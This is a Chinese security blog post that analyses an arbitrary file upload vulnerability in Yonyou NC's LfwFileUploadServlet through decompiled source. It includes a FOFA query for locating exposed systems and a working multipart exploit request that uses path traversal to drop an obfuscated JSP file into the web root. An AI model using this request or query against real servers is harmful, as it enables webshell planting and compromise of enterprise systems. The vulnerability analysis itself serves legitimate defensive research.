---
title: "用友NC LfwFileUploadServlet 任意文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-LfwFileUploadServlet-rce.html
asset_dir: assets/用友nc-lfwfileuploadservlet-任意文件上传漏洞
---

# 用友NC LfwFileUploadServlet 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/23 08:35
* 2205浏览
* [0评论](#comment)
* 1小时阅读

深入探索

应用

服务器

企业资源规划


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B) NC Cloud 是一种商业级的[企业资源规划](#)云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC系统 `LfwFileUploadServlet` 接口中的 `filename` 参数缺乏校验导致任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，可能造成服务器被后门控制。

漏洞预警服务

# 影响版本

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `nc/uap/lfw/core/servlet/LfwFileUploadServlet.class` 对应的业务逻辑实现

```
package nc.uap.lfw.core.servlet;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.uap.lfw.core.log.LfwLogger;
import nc.uap.lfw.core.serializer.impl.LfwJsonSerializer;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadBase;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import uap.lfw.core.ml.LfwResBundle;

public class LfwFileUploadServlet extends HttpServlet {
    private static final long serialVersionUID = -5347929490268322875L;
    public static final String SERVER_FILE_FOLDER = "d:\\uploadfiles\\";

    public LfwFileUploadServlet() {
    }

    public void init(ServletConfig config) throws ServletException {
        super.init(config);
    }

    public void service(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException {
        if (!ServletFileUpload.isMultipartContent(req)) {
            throw new IllegalArgumentException(LfwResBundle.getInstance().getStrByID("lfw", "LfwFileUploadServlet-000000"));
        } else {
            try {
                Object result = this.doSaveFiles(req, res);
                if (result != null) {
                    LfwJsonSerializer serializer = LfwJsonSerializer.getInstance();
                    String strResult = serializer.toJsObject(result);
                    req.setAttribute("result", strResult);
                }
            } catch (Exception e) {
                LfwLogger.error(e);
            }

        }
    }

    private Object doSaveFiles(HttpServletRequest req, HttpServletResponse res) throws Exception {
        try {
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(4096);
            File tempPathFile = new File("c:\\temp");
            if (!tempPathFile.exists()) {
                tempPathFile.mkdirs();
            }

            factory.setRepository(tempPathFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setSizeMax(10485760L);
            upload.setHeaderEncoding("UTF-8");
            List fileItems = upload.parseRequest(req);
            Iterator it = fileItems.iterator();
            String regExp = ".+\\\\(.+)$";
            String[] errorType = new String[]{".exe", ".com", ".cgi", ".asp"};
            Pattern p = Pattern.compile(regExp);
            String fileUploadHandler = req.getParameter("handler");
            Map parameterMap = req.getParameterMap();
            List<File> fileList = new ArrayList();
            File folder = new File("d:\\uploadfiles\\");
            if (!folder.exists()) {
                folder.mkdirs();
            }

            while(it.hasNext()) {
                FileItem item = (FileItem)it.next();
                if (!item.isFormField()) {
                    String name = item.getName();
                    String fileName = name;
                    long size = item.getSize();
                    if (name != null && !name.equals("") || size != 0L) {
                        Matcher m = p.matcher(name);
                        boolean result = m.find();
                        if (result) {
                            fileName = m.group(1);
                        }

                        for(int temp = 0; temp < errorType.length; ++temp) {
                            if (fileName.endsWith(errorType[temp])) {
                                throw new IOException(name + ": wrong type");
                            }
                        }

                        String time = this.getTime();
                        fileName = fileName.substring(0, fileName.lastIndexOf(".") - 1) + "_" + time + fileName.substring(fileName.lastIndexOf("."));
                        LfwLogger.debug("get file:" + name);
                        File file = new File("d:\\uploadfiles\\" + fileName);
                        if (!file.exists()) {
                            file.createNewFile();
                        }

                        item.write(file);
                        fileList.add(file);
                    }
                }
            }
        } catch (IOException e) {
            LfwLogger.error(e);
        } catch (FileUploadBase.SizeLimitExceededException e) {
            LfwLogger.error(e);
        } catch (FileUploadException e) {
            LfwLogger.error(e);
        }

        return null;
    }

    private String getTime() {
        Calendar c = Calendar.getInstance();
        String y = String.valueOf(c.get(1));
        String m = this.getRealStringValue(c.get(2));
        String d = this.getRealStringValue(c.get(5));
        String h = this.getRealStringValue(c.get(10));
        String mi = this.getRealStringValue(c.get(12));
        String s = this.getRealStringValue(c.get(13));
        String ms = this.getRealStringValue(14);
        String time = y + m + d + h + mi + s + ms;
        return time;
    }

    private String getRealStringValue(int value) {
        String realValue = String.valueOf(value);
        realValue = realValue.length() == 1 ? "0" + realValue : realValue;
        return realValue;
    }
}
```

在开头定义了一个静态常量 `SERVER_FILE_FOLDER` 指定文件上传的目标目录为 `d:\uploadfiles\`。

接下来就是核心业务逻辑处理 `service` 方法，这个方法主要是处理文件上传。

企业资源规划

调用 `doSaveFiles(req, res)` 方法处理文件保存的逻辑。

重点看 文件保存逻辑 - `doSaveFiles` 方法:

* 设置临时文件目录为 `c:\temp`，如果目录不存在则创建。
* 设置最大上传文件大小为 10MB（`10485760L`）。
* 然后遍历文件上传列表，通过正则表达式 `.+\\\\(.+)$` 提取文件名。
* 检查文件扩展名是否属于非法类型（如 `.exe`, `.com`, `.cgi`, `.asp`），如果是则抛出异常。（Java应用你校验这些后缀？？？）
* 文件重命名采用时间戳函数 getTime()，而 getTime() 函数为获取当前时间，并格式化为字符串（年、月、日、时、分、秒、毫秒），用于文件重命名。
* `getRealStringValue` 函数仅仅是为了处理数字长度，如果数字长度为 1，则在前面补 0（如 `1` 转为 `01`），确保时间格式一致。

重点看文件保存，重命名处理如下

```
String time = this.getTime();
fileName = fileName.substring(0, fileName.lastIndexOf(".") - 1) + "_" + time + fileName.substring(fileName.lastIndexOf("."));
LfwLogger.debug("get file:" + name);
File file = new File("d:\\uploadfiles\\" + fileName);
if (!file.exists()) {
    file.createNewFile();
}

item.write(file);
fileList.add(file);
```

假设上传的文件名为 `test.jsp`，处理流程如下

计算机服务器

1. 文件名的初始值

* 假设上传的文件名为 `test.jsp`，此时 `fileName = "test.jsp"`。

2. `fileName.lastIndexOf(".")`

* `fileName.lastIndexOf(".")` 返回文件名中最后一个 `.` 的索引。
  + 对于 `test.jsp`，最后一个 `.` 的索引是 `4`（从 0 开始计数）。

3. `fileName.substring(0, fileName.lastIndexOf(".") - 1)`

* `fileName.lastIndexOf(".") - 1` 的值是 `4 - 1 = 3`。
* `fileName.substring(0, 3)` 表示从文件名的第 0 个字符开始截取到第 3 个字符（不包括第 3 个字符）。
  + 对于 `test.jsp`，结果是 `"tes"`。

4. 时间戳拼接

* 假设调用 `this.getTime()` 方法返回的时间戳是 `20231010120000123`。
* 拼接时间戳后，文件名变为：
* "tes" + "\_" + "20231010120000123"
* 结果是 `"tes_20231010120000123"`。

5. 文件扩展名拼接

* `fileName.substring(fileName.lastIndexOf("."))`：
  + `fileName.lastIndexOf(".")` 是 `4`。
  + `fileName.substring(4)` 表示从索引 `4` 开始截取到字符串末尾。
  + 对于 `test.jsp`，结果是 `".jsp"`。
* 拼接扩展名后，最终文件名变为：
* "tes\_20231010120000123" + ".jsp"
* 结果是 `"tes_20231010120000123.jsp"`。

6. 最终保存路径

* 文件保存路径是通过以下代码生成的：
* File file = new File("d:\uploadfiles\" + fileName);
* 将拼接后的文件名 `"tes_20231010120000123.jsp"` 添加到目录路径 `d:\uploadfiles\` 后，最终的文件保存路径为：
* d:\uploadfiles\tes\_20231010120000123.jsp

对于文件名没有校验，那我们可以通过目录穿越上传至 nc\_web 目录下即可访问到（需要没有跨盘符，一般是没有跨）。即使用如下 filename `../yonyou/home/webapps/nc_web/test.jsp` 那么上传后的文件极可能在 `nc_web` 目录下的 tes\_20231010120000123.jsp 。

漏洞预警服务

# 漏洞复现

```
POST /servlet/~ic/nc.uap.lfw.core.servlet.LfwFileUploadServlet HTTP/1.1
Content-Type: multipart/form-data; boundary=123456
Host: nc.mrxn.net

--123456
Content-Disposition: form-data; name="handler"
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 8bit

upload_handler
--123456
Content-Disposition: form-data; name="file"; filename="../yonyou/home/webapps/nc_web/1740xxxxxx.jsp"
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: binary

<%\u006f\u0075\u0074.\u0070\u0072\u0069\u006e\u0074("yy"+"ds");%>
--123456--
```

访问文件 /1740xxxxxx\_202xxxxxxxxxxxxx.jsp

[![用友NC LfwFileUploadServlet 任意文件上传漏洞](images/img-001-4dab3fce036d.webp)](https://image.mrxn.net/4e9c875f0b7649388817fc6a9b145383.webp)

成功上传

不过文件名需要爆破时间戳部分

[![用友NC LfwFileUploadServlet 任意文件上传漏洞](images/img-002-ebfe2c38549b.webp)](https://image.mrxn.net/3182d9e6e04f44f4baff2d44d8b9151f.webp)

# 参考

* `https://github.com/ax1sX/SecurityList/blob/main/Java_OA/yongyou_NC_Audit.md`
* `https://github.com/Chave0v0/YONYOU-TOOL/blob/main/src/main/java/com/chave/vuln/LfwFileUploadServlet_Upload.java#L131`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC LfwFileUploadServlet 任意文件上传漏洞](https://mrxn.net/jswz/yonyou-ncc-LfwFileUploadServlet-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-ncc-LfwFileUploadServlet-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-LfwFileUploadServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
